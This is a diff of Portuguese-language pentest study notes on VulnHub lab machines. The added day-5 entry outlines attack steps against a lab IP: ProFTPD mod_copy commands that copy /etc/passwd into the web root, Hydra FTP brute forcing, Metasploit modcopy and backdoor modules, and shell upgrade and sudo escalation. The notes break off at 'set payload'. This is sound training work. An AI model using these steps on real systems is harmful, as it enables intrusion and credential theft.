@@ -3,6 +3,8 @@ desafio 1 - https://www.vulnhub.com/entry/hacker-fest-2019,378/
 desafio 2 - https://pentesterlab.com/exercises/s2-052/course
 desafio 3 - https://www.vulnhub.com/entry/droopy-v02,143/
 desafio 4 - https://www.vulnhub.com/entry/digitalworldlocal-joy,298/
+desafio 5 - https://www.vulnhub.com/entry/violator-1,153/
+desafio 6 - https://www.vulnhub.com/entry/w1r3s-101,220/
 
 --VM--
   
@@ -94,3 +96,44 @@ Dia 4 			10/9/2020
 
 		*executar 
 			sudo /home/patrick/script/test			
+			
+
+
+
+Dia 5 			11/9/2020
+
+	*Scan básico
+		-sV -Pn  ip_alvo
+		
+	*criação de world list com dados do link (link na página local)
+	
+	*nc ip port
+		site cpfr /etc/passwd
+		site cpto  /var/www/html/passwd
+		
+			http://192.168.100.8/passwd
+			
+		*criação lista de users
+			mg
+			af
+			dg
+			aw
+			
+		*hydra pra brute force ftp
+			-L userlist.txt -P passlist.txt  192.168.100.8 ftp
+			
+		* msfconsole unix/ftp/proftpd_modcopy_exec
+			entrar shell interativo
+				python pty...
+			sudo -l
+			sudo /home/dg/bd/sbin/proftpd
+			
+			upar para meterpreter
+				session -u sessão
+				
+				portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1
+				
+				use exploit/unix/ftp/proftpd_133c_backdoor 
+				
+				set payload
+				
